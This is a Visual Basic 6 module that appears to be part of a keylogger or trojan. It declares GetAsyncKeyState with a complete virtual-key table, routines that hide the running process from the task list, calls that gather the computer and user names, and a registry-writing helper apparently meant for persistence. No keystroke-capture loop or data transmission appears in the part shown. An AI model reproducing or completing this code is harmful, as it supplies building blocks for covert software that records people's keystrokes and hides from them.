Attribute VB_Name = "codes"
Option Explicit


Declare Function GetAsyncKeyState Lib "user32.dll" (ByVal vKey As Long) As Integer

Public Const VK_LBUTTON = &H1
Public Const VK_RBUTTON = &H2
Public Const VK_CANCEL = &H3
Public Const VK_MBUTTON = &H4
Public Const VK_BACK = &H8
Public Const VK_TAB = &H9
Public Const VK_CLEAR = &HC
Public Const VK_RETURN = &HD
Public Const VK_SHIFT = &H10
Public Const VK_CONTROL = &H11
Public Const VK_MENU = &H12
Public Const VK_PAUSE = &H13
Public Const VK_CAPITAL = &H14
Public Const VK_ESCAPE = &H1B
Public Const VK_SPACE = &H20
Public Const VK_PRIOR = &H21
Public Const VK_NEXT = &H22
Public Const VK_END = &H23
Public Const VK_HOME = &H24
Public Const VK_LEFT = &H25
Public Const VK_UP = &H26
Public Const VK_RIGHT = &H27
Public Const VK_DOWN = &H28
Public Const VK_SELECT = &H29
Public Const VK_PRINT = &H2A
Public Const VK_EXECUTE = &H2B
Public Const VK_SNAPSHOT = &H2C
Public Const VK_INSERT = &H2D
Public Const VK_DELETE = &H2E
Public Const VK_HELP = &H2F
Public Const VK_0 = &H30
Public Const VK_1 = &H31
Public Const VK_2 = &H32
Public Const VK_3 = &H33
Public Const VK_4 = &H34
Public Const VK_5 = &H35
Public Const VK_6 = &H36
Public Const VK_7 = &H37
Public Const VK_8 = &H38
Public Const VK_9 = &H39
Public Const VK_A = &H41
Public Const VK_B = &H42
Public Const VK_C = &H43
Public Const VK_D = &H44
Public Const VK_E = &H45
Public Const VK_F = &H46
Public Const VK_G = &H47
Public Const VK_H = &H48
Public Const VK_I = &H49
Public Const VK_J = &H4A
Public Const VK_K = &H4B
Public Const VK_L = &H4C
Public Const VK_M = &H4D
Public Const VK_N = &H4E
Public Const VK_O = &H4F
Public Const VK_P = &H50
Public Const VK_Q = &H51
Public Const VK_R = &H52
Public Const VK_S = &H53
Public Const VK_T = &H54
Public Const VK_U = &H55
Public Const VK_V = &H56
Public Const VK_W = &H57
Public Const VK_X = &H58
Public Const VK_Y = &H59
Public Const VK_Z = &H5A
Public Const VK_STARTKEY = &H5B
Public Const VK_CONTEXTKEY = &H5D
Public Const VK_NUMPAD0 = &H60
Public Const VK_NUMPAD1 = &H61
Public Const VK_NUMPAD2 = &H62
Public Const VK_NUMPAD3 = &H63
Public Const VK_NUMPAD4 = &H64
Public Const VK_NUMPAD5 = &H65
Public Const VK_NUMPAD6 = &H66
Public Const VK_NUMPAD7 = &H67
Public Const VK_NUMPAD8 = &H68
Public Const VK_NUMPAD9 = &H69
Public Const VK_MULTIPLY = &H6A
Public Const VK_ADD = &H6B
Public Const VK_SEPARATOR = &H6C
Public Const VK_SUBTRACT = &H6D
Public Const VK_DECIMAL = &H6E
Public Const VK_DIVIDE = &H6F
Public Const VK_F1 = &H70
Public Const VK_F2 = &H71
Public Const VK_F3 = &H72
Public Const VK_F4 = &H73
Public Const VK_F5 = &H74
Public Const VK_F6 = &H75
Public Const VK_F7 = &H76
Public Const VK_F8 = &H77
Public Const VK_F9 = &H78
Public Const VK_F10 = &H79
Public Const VK_F11 = &H7A
Public Const VK_F12 = &H7B
Public Const VK_F13 = &H7C
Public Const VK_F14 = &H7D
Public Const VK_F15 = &H7E
Public Const VK_F16 = &H7F
Public Const VK_F17 = &H80
Public Const VK_F18 = &H81
Public Const VK_F19 = &H82
Public Const VK_F20 = &H83
Public Const VK_F21 = &H84
Public Const VK_F22 = &H85
Public Const VK_F23 = &H86
Public Const VK_F24 = &H87
Public Const VK_NUMLOCK = &H90
Public Const VK_OEM_SCROLL = &H91
Public Const VK_OEM_1 = &HBA
Public Const VK_OEM_PLUS = &HBB
Public Const VK_OEM_COMMA = &HBC
Public Const VK_OEM_MINUS = &HBD
Public Const VK_OEM_PERIOD = &HBE
Public Const VK_OEM_2 = &HBF
Public Const VK_OEM_3 = &HC0
Public Const VK_OEM_4 = &HDB
Public Const VK_OEM_5 = &HDC
Public Const VK_OEM_6 = &HDD
Public Const VK_OEM_7 = &HDE
Public Const VK_OEM_8 = &HDF
Public Const VK_ICO_F17 = &HE0
Public Const VK_ICO_F18 = &HE1
Public Const VK_OEM102 = &HE2
Public Const VK_ICO_HELP = &HE3
Public Const VK_ICO_00 = &HE4
Public Const VK_ICO_CLEAR = &HE6
Public Const VK_OEM_RESET = &HE9
Public Const VK_OEM_JUMP = &HEA
Public Const VK_OEM_PA1 = &HEB
Public Const VK_OEM_PA2 = &HEC
Public Const VK_OEM_PA3 = &HED
Public Const VK_OEM_WSCTRL = &HEE
Public Const VK_OEM_CUSEL = &HEF
Public Const VK_OEM_ATTN = &HF0
Public Const VK_OEM_FINNISH = &HF1
Public Const VK_OEM_COPY = &HF2
Public Const VK_OEM_AUTO = &HF3
Public Const VK_OEM_ENLW = &HF4
Public Const VK_OEM_BACKTAB = &HF5
Public Const VK_ATTN = &HF6
Public Const VK_CRSEL = &HF7
Public Const VK_EXSEL = &HF8
Public Const VK_EREOF = &HF9
Public Const VK_PLAY = &HFA
Public Const VK_ZOOM = &HFB
Public Const VK_NONAME = &HFC
Public Const VK_PA1 = &HFD
Public Const VK_OEM_CLEAR = &HFE

'Hide/Unhide from task list
Public Declare Function GetCurrentProcessId Lib "kernel32" () As Long
Public Declare Function GetCurrentProcess Lib "kernel32" () As Long
Public Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessID As Long, ByVal dwType As Long) As Long
                                  
Public Const RSP_SIMPLE_SERVICE = 1
Public Const RSP_UNREGISTER_SERVICE = 0

'Computer information

Declare Function GetComputerName Lib "kernel32.dll" Alias "GetComputerNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Declare Function GetWindowsDirectory Lib "kernel32.dll" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long

'Registery
Type SECURITY_ATTRIBUTES
    nLength As Long
    lpSecurityDescriptor As Long
    bInheritHandle As Boolean
End Type

Declare Function RegSetValueEx Lib "advapi32" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal szData As String, ByVal cbData As Long) As Long
Declare Function RegCloseKey Lib "advapi32" (ByVal hKey As Long) As Long
Declare Function RegCreateKeyEx Lib "advapi32" Alias "RegCreateKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, lpSecurityAttributes As SECURITY_ATTRIBUTES, phkResult As Long, lpdwDisposition As Long) As Long
Public Const REG_SZ As Long = 1
Public Const REG_BINARY As Long = 3
Public Const REG_DWORD As Long = 4
Public Const HKEY_CLASSES_ROOT = &H80000000
Public Const HKEY_CURRENT_USER = &H80000001
Public Const HKEY_LOCAL_MACHINE = &H80000002
Public Const HKEY_USERS = &H80000003
Public Const ERROR_NONE = 0
Public Const ERROR_BADDB = 1
Public Const ERROR_BADKEY = 2
Public Const ERROR_CANTOPEN = 3
Public Const ERROR_CANTREAD = 4
Public Const ERROR_CANTWRITE = 5
Public Const ERROR_OUTOFMEMORY = 6
Public Const ERROR_INVALID_PARAMETER = 7
Public Const ERROR_ACCESS_DENIED = 8
Public Const ERROR_INVALID_PARAMETERS = 87
Public Const ERROR_NO_MORE_ITEMS = 259
Public Const ERROR_SUCCESS = 0&
Public Const KEY_ALL_ACCESS = &H3F
Public Const REG_OPTION_NON_VOLATILE = 0



Public Sub HideApp()

Dim process As Long

process = GetCurrentProcessId()
Call RegisterServiceProcess(process, RSP_SIMPLE_SERVICE)

End Sub
                              


Public Sub UnHideApp()

Dim process As Long

process = GetCurrentProcessId()
Call RegisterServiceProcess(process, RSP_UNREGISTER_SERVICE)

End Sub

Public Function bSetRegValue(ByVal hKey As Long, ByVal lpszSubKey As String, ByVal sSetValue As String, ByVal sValue As String) As Boolean
 
On Error GoTo ERROR_HANDLER

Dim phkResult As Long
Dim lResult As Long
Dim SA As SECURITY_ATTRIBUTES
Dim lCreate As Long

RegCreateKeyEx hKey, lpszSubKey, 0, "", REG_OPTION_NON_VOLATILE, _
KEY_ALL_ACCESS, SA, phkResult, lCreate
lResult = RegSetValueEx(phkResult, sSetValue, 0, 1, sValue, _
CLng(Len(sValue) + 1))

RegCloseKey phkResult

bSetRegValue = (lResult = ERROR_SUCCESS)
Exit Function
ERROR_HANDLER:
MsgBox "ERROR #" & Str$(Err) & " : " & Error & Chr(13) _
& "Please Exit and try again."
bSetRegValue = False

End Function


